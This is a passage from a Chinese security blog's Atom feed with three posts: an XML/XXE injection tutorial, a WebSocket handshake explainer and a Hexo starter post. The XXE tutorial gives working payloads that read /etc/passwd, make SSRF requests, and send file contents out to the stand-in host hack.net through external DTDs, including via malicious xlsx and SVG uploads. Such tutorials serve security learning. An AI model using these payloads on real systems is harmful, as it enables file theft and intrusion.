    <id>https://hosch3n.github.io/2020/08/16/XML%E5%9F%BA%E7%A1%80%E4%B8%8EXXE%E6%B3%A8%E5%85%A5/</id>
    <published>2020-08-16T13:32:00.000Z</published>
    <updated>2021-03-01T09:43:19.085Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种被设计用来存储和传输数据的语言，叫作<em>可扩展标记语言</em>，通过自定义标签的形式描述数据。</p><h3 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h3><p>为了区分开表示数据的尖括号和表示结构的标签，在数据中用<code>&amp;lt;</code>和<code>&amp;gt;</code>这类预定义的XML实体来表示左右尖括号。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>XML通过头部的DTD（文档类型定义）来定义文档结构，实际内容直接写在文档里的DTD叫作<code>内部DTD</code>，实际内容放在外面，要通过引用加载的DTD叫作<code>外部DTD</code>，二者可以在XML中混用。</p><h3 id="自定义实体"><a href="#自定义实体" class="headerlink" title="自定义实体"></a>自定义实体</h3><p>如果预定义的XML实体不够用，就可以自定义新的XML实体：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY id &quot;hosch3n&quot; &gt; ]&gt;</code></p><p>这样就可以用<code>&amp;id;</code>表示<code>hosch3n</code>这个值。</p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>自定义实体的实际内容不一定要写在DTD里，也可以写在外面然后通过引用加载：</p><p><code>&lt;!DOCTYPE test [ &lt;!ENTITY ext SYSTEM &quot;http://xxx.com&quot; &gt; ]&gt;</code></p><ul><li>支持http、ftp、file等协议</li></ul><h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1/&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;xxe;</span></span><br></pre></td></tr></table></figure><h3 id="OAST"><a href="#OAST" class="headerlink" title="OAST"></a>OAST</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http:&#x2F;&#x2F;hack.net&#x2F;?x&#x3D;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfiltrate;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span></span></span></span><br><span class="line"><span class="meta"><span class="meta"><span class="meta-string">&quot;http://hack.net/hack.dtd&quot;</span>&gt;</span> %xxe;]&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><ul><li>数据在服务器端拼接进XML文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span> <span class="attr">href</span>=<span class="string">&quot;file:///etc/passwd&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Apache-POI"><a href="#Apache-POI" class="headerlink" title="Apache POI"></a>Apache POI</h3><ul><li>文件上传xlsx文档</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># xxe.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://hack.net/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># [Content_Types].xml</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://hack.net/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ZIP压缩后改后缀为<code>xlsx</code></p><h3 id="Apache-Batik"><a href="#Apache-Batik" class="headerlink" title="Apache Batik"></a>Apache Batik</h3><ul><li>文件上传SVG头像</li></ul><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/hostname&quot;</span> &gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;128px&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">font-size</span>=<span class="string">&quot;16&quot;</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;16&quot;</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XML基础&quot;&gt;&lt;a href=&quot;#XML基础&quot; class=&quot;headerlink&quot; title=&quot;XML基础&quot;&gt;&lt;/a&gt;XML基础&lt;/h2&gt;&lt;p&gt;XML是一种被设计用来存储和传输数据的语言，叫作&lt;em&gt;可扩展标记语言&lt;/em&gt;，通过自定义标签的形式描述数据。&lt;/</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="xml" scheme="https://hosch3n.github.io/tags/xml/"/>
    
    <category term="xxe" scheme="https://hosch3n.github.io/tags/xxe/"/>
    
  </entry>
  
  <entry>
    <title>建立WebSocket连接</title>
    <link href="https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/"/>
    <id>https://hosch3n.github.io/2020/08/16/%E5%BB%BA%E7%AB%8BWebSocket%E8%BF%9E%E6%8E%A5/</id>
    <published>2020-08-16T12:33:06.000Z</published>
    <updated>2021-03-01T09:42:37.189Z</updated>
    
    <content type="html"><![CDATA[<p>WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;wss://xxx.com/func&quot;</span>);</span><br></pre></td></tr></table></figure><p>首次建立WS连接时会通过HTTP协议握手协商：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/func</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx.com</span><br><span class="line">...</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span>: 13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span>: QKVMhgEVGz7jTFD5PIizrQ==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">101</span> Switching Protocol</span><br><span class="line"><span class="attribute">Connection</span>: Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span>: GUgfO45/U2Oo5uUkpUR3jnm3zcA=</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>Connection</code>与<code>Upgrade</code>表明这是WS握手，<code>Sec-WebSocket-Version</code>表示客户端希望使用的版本，<code>Sec-WebSocket-Key</code>为随机产生的Base64编码，<code>Sec-WebSocket-Accept</code>会响应该随机值的哈希。</p><p>握手成功后便可基于WS协议传输任意格式的数据，常用JSON：<code>ws.send(&#123;&quot;a&quot;: 1&#125;);</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;WebSocket是一种双向全双工的应用层协议，通常用在要求低延迟或需要服务器主动发送请求的地方。WSS与WS就像HTTPS与HTTP的关系一样，多了TLS加密层。&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="ws" scheme="https://hosch3n.github.io/tags/ws/"/>
    
    <category term="js" scheme="https://hosch3n.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://hosch3n.github.io/2020/08/16/hello-world/"/>
    <id>https://hosch3n.github.io/2020/08/16/hello-world/</id>
    <published>2020-08-15T16:00:00.000Z</published>
    <updated>2021-01-10T10:01:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="Addition-modules"><a href="#Addition-modules" class="headerlink" title="Addition modules"></a>Addition modules</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-scss --save</span><br><span class="line">npm install hexo-renderer-swig --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br><span class="line">hexo new page categories</span><br><span class="line">hexo new page about</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
